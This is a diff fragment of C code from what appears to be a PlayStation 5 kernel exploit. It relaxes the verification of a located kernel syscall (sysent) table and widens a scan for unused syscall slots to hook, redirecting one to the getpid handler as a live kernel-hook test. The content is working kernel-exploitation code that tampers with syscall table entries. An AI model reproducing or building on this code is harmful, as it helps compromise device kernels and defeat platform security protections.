@@ -2405,19 +2405,21 @@ ring3_fallback:
             printf("    nosys consistency: %d/%d high entries point to nosys (0x%lx)\n",
                    nosys_cnt, checked, (unsigned long)nosys_call);
 
-            int sysent_verified = (narg_ok == narg_total && narg_total >= 10
-                                   && nosys_cnt > 30);
+            /* 12/12 narg match is strong proof. PS5 has ~117 custom Sony
+             * syscalls in 600-723, so nosys count is just informational. */
+            int sysent_verified = (narg_ok == narg_total && narg_total >= 10);
             if (sysent_verified)
-                printf("[+] Sysent table verified!\n");
+                printf("[+] Sysent table VERIFIED (12/12 narg match)!\n");
             else
-                printf("[-] Sysent verification weak — proceeding cautiously.\n");
+                printf("[-] Sysent verification failed (%d/%d narg).\n",
+                       narg_ok, narg_total);
             fflush(stdout);
 
             /* Live hook test: redirect an unused syscall to getpid handler */
             if (sysent_verified) {
-                /* Find an unused (nosys) syscall in the 710-723 range */
+                /* Find an unused (nosys) syscall — scan wide range */
                 int test_sc = -1;
-                for (int i = 720; i >= 700; i--) {
+                for (int i = 723; i >= 500; i--) {
                     uint64_t pa = va_to_pa_quiet(
                         sysent_kva + (uint64_t)i * SYSENT_STRIDE + 8);
                     if (!pa) continue;
